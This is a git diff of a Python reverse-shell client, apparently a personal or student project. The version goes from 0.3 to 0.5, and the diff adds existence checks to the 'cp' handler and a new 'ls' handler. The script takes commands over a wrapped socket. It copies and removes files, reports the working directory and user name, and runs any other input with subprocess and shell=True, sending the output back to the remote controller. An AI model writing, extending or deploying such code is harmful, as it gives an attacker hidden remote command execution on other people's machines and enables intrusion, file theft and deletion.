@@ -1,5 +1,5 @@
 # client_revershell
-# Version 0.3
+# Version 0.5
 # Auteur : Raphaël KATHALUWA-LIYANAGE
 
 # import des librairies suivantes :
@@ -49,9 +49,23 @@ try:
             output = os.getcwd()
             wrappedSocket.sendall(output.encode()) 
         elif cmd[0] == "cp":
-            shutil.copy2(cmd[1], cmd[2])
-            output = f"{cmd[2]} has been created!"
-            wrappedSocket.sendall(output.encode())
+            if cmd[2] and not os.path.exists(cmd[2]):
+                shutil.copy2(cmd[1], cmd[2])
+                output = f"{cmd[2]} has been created!"
+                wrappedSocket.sendall(output.encode())
+            elif os.path.exists(cmd[2]):
+                output = f"{cmd[2]} already exists!"
+                wrappedSocket.sendall(output.encode())
+            else:
+                output = f"usage: cp <source> <destination>"
+                wrappedSocket.sendall(output.encode())
+        elif cmd[0] == "ls":
+            if os.name == 'nt':
+                output = subprocess.check_output(["dir"], shell=True, text=True)
+                wrappedSocket.sendall(output.encode())
+            else:
+                output = subprocess.check_output(["ls -al"], shell=True, text=True)
+                wrappedSocket.sendall(output.encode())
         elif cmd[0] == "rm":
             if os.path.exists(cmd[1]):
                 os.remove(cmd[1])
@@ -64,8 +78,9 @@ try:
             output = os.environ.get('USERNAME')
             wrappedSocket.sendall(output.encode())
         else:
-            command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
-                                    stderr=subprocess.PIPE)
+            command = subprocess.Popen(cmd, shell=True, text=True,
+                                       stdout=subprocess.PIPE, 
+                                       stderr=subprocess.PIPE)
             output, err = command.communicate()
             if output:
                 wrappedSocket.sendall(output) 
